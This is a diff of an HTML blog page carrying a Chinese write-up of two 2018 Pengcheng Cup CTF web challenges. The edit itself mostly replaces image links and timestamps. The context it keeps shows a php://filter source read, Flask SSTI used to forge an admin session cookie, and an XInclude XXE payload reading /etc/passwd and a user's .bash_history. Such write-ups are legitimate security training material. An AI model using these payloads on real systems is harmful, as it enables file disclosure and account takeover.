@@ -606,7 +606,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-05-03 11:35:39'>2018-12-02 11:33</time>
+        创建时间:<time class="date" title='更新时间: 2020-05-03 11:48:19'>2018-12-02 11:33</time>
         
     </div>
     <div class="article-meta">
@@ -658,7 +658,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="myblog"><a href="#myblog" class="headerlink" title="myblog"></a>myblog</h1><blockquote>
-<p>十足的脑洞题！=-=<br>访问index.php响应头中发现提示信息：<code>?flag</code><br><img src="https://upload-images.jianshu.io/upload_images/6934571-ad0d75baf10ead53.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>php://filter实现文件读取<br>php://filter/convert.base64-encode/resource=index获得index.php源码。</p>
+<p>十足的脑洞题！=-=<br>访问index.php响应头中发现提示信息：<code>?flag</code><br><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114437602.png" alt><br>php://filter实现文件读取<br>php://filter/convert.base64-encode/resource=index获得index.php源码。</p>
 </blockquote>
 <pre><code>&lt;?php 
     header(&#39;flag: JTNGZmxhZw==&#39;);
@@ -687,11 +687,11 @@
     }
 
 ?&gt;</code></pre><blockquote>
-<p>变量覆盖,获取flag<br><img src="https://upload-images.jianshu.io/upload_images/6934571-eb76feb39205dad8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p>变量覆盖,获取flag<br><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114455941.png" alt></p>
 </blockquote>
 <h1 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h1><blockquote>
 <ul>
-<li>提示信息：flask,/upload<br>访问upload提示需要admin登录<br>尝试flask ssti<br><img src="https://upload-images.jianshu.io/upload_images/6934571-67c46faafce16259.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>思路目前已经比较明确了<br>利用ssti读取secretkey伪造session，让自身变为admin访问/upload</li>
+<li>提示信息：flask,/upload<br>访问upload提示需要admin登录<br>尝试flask ssti<br><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114621417.png" alt><br>思路目前已经比较明确了<br>利用ssti读取secretkey伪造session，让自身变为admin访问/upload</li>
 </ul>
 </blockquote>
 <blockquote>
@@ -764,19 +764,19 @@ if __name__==&#39;__main__&#39;:
     new_cookie = csi.encode(decoded_cookie)
     print &quot;+ MODIFIED SECRET ENCODED COOKIE:&quot;, new_cookie</code></pre><blockquote>
 <ul>
-<li>/upload为一个上传页面，随意上传文件500=-=<br>迷……<br>然后发现<br><img src="https://upload-images.jianshu.io/upload_images/6934571-ecb8d647eeb03d84.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li>
+<li>/upload为一个上传页面，随意上传文件500=-=<br>迷……<br>然后发现<br><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114652410.png" alt>))</li>
 </ul>
 </blockquote>
 <blockquote>
 <ul>
-<li>尝试xxe，测试发现禁用了<code>&lt;!ENTITY</code>，<code>&lt;!DOCTYPE</code><br><img src="https://upload-images.jianshu.io/upload_images/6934571-57874dc0a401b99c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>搜索了一波xxe payload，测试发现可以用xinclude<br>payload:</li>
+<li>尝试xxe，测试发现禁用了<code>&lt;!ENTITY</code>，<code>&lt;!DOCTYPE</code><br><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114708041.png" alt><br>搜索了一波xxe payload，测试发现可以用xinclude<br>payload:</li>
 </ul>
 </blockquote>
 <pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
 &lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;
  &lt;xi:include href=&quot;file:///etc/passwd&quot; parse=&quot;text&quot;/&gt;
 &lt;/root&gt;</code></pre><blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/6934571-34e86d6f4f6723ed.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>不能列目录，有点懵~<br>发现其中有一个rq用户比较可疑<br>尝试读取/home/rq/.bash_history<br><img src="https://upload-images.jianshu.io/upload_images/6934571-05f636863033109f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>读取flag<br><img src="https://upload-images.jianshu.io/upload_images/6934571-74d09a274e027a20.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114733257.png" alt><br>不能列目录，有点懵~<br>发现其中有一个rq用户比较可疑<br>尝试读取/home/rq/.bash_history<br><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114755730.png" alt><br>读取flag<br><img src="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/image-20200503114813276.png" alt></p>
 </blockquote>
 
       
@@ -791,7 +791,7 @@ if __name__==&#39;__main__&#39;:
     <p><span class="copy-title">文章字数:</span><span class="post-count">859</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="Sh@d0w">Sh@d0w</a></p>
     <p><span class="copy-title">发布时间:</span>2018-12-02, 11:33:21</p>
-    <p><span class="copy-title">最后更新:</span>2020-05-03, 11:35:39</p>
+    <p><span class="copy-title">最后更新:</span>2020-05-03, 11:48:19</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/" title="“鹏城杯”2018部分web wp">https://shadow-zz.github.io/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
